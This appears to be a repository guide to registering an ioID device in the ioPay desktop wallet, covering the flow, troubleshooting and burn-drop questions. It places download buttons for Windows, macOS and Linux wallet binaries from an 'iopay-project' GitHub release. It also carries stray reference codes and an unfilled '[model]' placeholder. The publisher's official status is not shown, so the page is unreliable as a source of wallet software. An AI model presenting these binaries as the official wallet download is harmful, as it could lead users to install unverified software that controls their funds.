![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Registering an ioID Device With ioPay Wallet

`ioID` is **IoTeX's device identity layer** - the mechanism that lets a physical device be recognised on-chain and associated with an account (F033). Registering a device is what makes it visible to the wallet, and therefore what makes its earnings trackable at all.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

In this build, registration is offered from the DePIN section as a one-click flow (F025). This page covers what the step does, how to run it, and what to check when it does not work.

## What registration actually does

Three things, and it helps to know which is which:

1. **It creates an on-chain identity for the device.** That identity is what projects and the chain can refer to.
2. **It ties the device to an account** - the one you are signing from. This is why a device registered from another account will not appear in this one.
3. **It is a transaction**, so it needs a signature and it costs whatever the network charges. [Back up your phrase](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md) before you start signing things.

What it does **not** do: register the device with every project, promise earnings, or qualify you for burn-drop on its own. Burn-drop depends on device activation and on having **qualified staking buckets** (F033).

## The flow

1. **Open the DePIN section** of the wallet and find device registration.
2. **Start the registration** and confirm the device identity the flow asks for.
3. **Check the account** you are registering from - this is the account that will see the device.
4. **Sign the transaction.** If you use a hardware wallet, confirm on the device.
5. **Confirm the device appears** in the device list. Registration is complete when it is listed, not when the transaction is signed.

If the device is listed but shows no earnings, that is normal for a device that has not yet contributed anything - earnings appear as projects credit them.

## "My registration failed - how do I start over?"

Registration is retryable: nothing about a failed attempt locks the device or the account. Before retrying, check the four things that actually cause failures:

- **Is the app connected?** A registration is a transaction; if the wallet cannot reach a node, it cannot submit one. [Network errors](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-not-connecting-to-network.md).
- **Are you on the account you meant?** Registering from a second account creates the device under that account, which then looks "missing" from the first.
- **Is the device already registered?** A device registered earlier - possibly to the same account - may not need a second registration.
- **Is the build current?** v2.0.2, 19 November 2026, is the release this page describes. An older build is the usual explanation for a flow that behaves differently from this description.

If all four are clean and the flow still fails, report it rather than retrying repeatedly. This repository has no public issue thread, so there is no community record to compare against - a limitation worth knowing before you spend an hour on it.

## "Does a new device mean new burn-drop?"

The question usually arrives as "does a new device mean [model] for burn-drop", and the answer has two halves:

**Mechanically:** burn-drop follows **device activation** - activation burns IOTX and restakes it to qualified staking buckets (F033). A new device is a new activation, which is why people associate adding hardware with a change on the burn-drop side.

**Practically:** which device models a project supports, and what qualifies, is set by **the project**, not by the wallet. This page will not name a model as supported, because that is a claim about someone else's product list on a given day. Check the project's own documentation, then register the device here and watch what the dashboard reports.

And the qualifier that matters most: allocations attach to **qualified staking buckets**. If you have not staked, or your buckets do not qualify, a new device does not create an allocation by itself. [Staking and buckets](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md).

## What to check after registering

- **The device appears** in the list, under the right account.
- **The dashboard shows it** with zero earnings if it is new - that is expected. [Reading the dashboard](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-depin-earnings-dashboard-explained.md).
- **Your staking side is as you expect**, if you are watching burn-drop. [Tracking rewards](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/tracking-depin-device-rewards-in-iopay-wallet.md).
- **The phrase is still backed up and tested.** Registration means more signing, which means more reliance on the account.

## FAQ

**How do I register an ioID device from ioPay?**
Open the DePIN section, start registration, confirm the device identity, sign from the account you want the device tied to, then confirm it appears in the device list.

**My device registration failed - how do I start over?**
Retry after checking connectivity, the selected account, whether the device is already registered, and the app version. A failure does not lock anything.

**Does a new device mean burn-drop allocations?**
Activation is the mechanism, and allocations attach to qualified staking buckets. Whether a specific model qualifies is the project's decision, not the wallet's.

**Does registering a device guarantee earnings?**
No. Registration makes the device visible. Earnings depend on the project's economics and on the resource your device actually contributes.

**Can I register a device without staking?**
Yes. Registration does not require staking; burn-drop qualification does.

## One device, one registration

Register each physical device under the account you intend to watch, and confirm it appears in the list before you add the next. Registration is a transaction, so it costs the network fee, and the device list is the record of what you have already done.

Several devices under one account is normal and needs nothing extra. Several accounts holding different devices is also possible, and it is the arrangement that makes a device look missing when you switch accounts. Decide which account owns which hardware before you sign anything, and write it down.

---

*ioID and burn-drop follow IoTeX documentation; the registration flow follows the v2.0.2 feature set. No device model is named as supported, and no earnings are promised.*
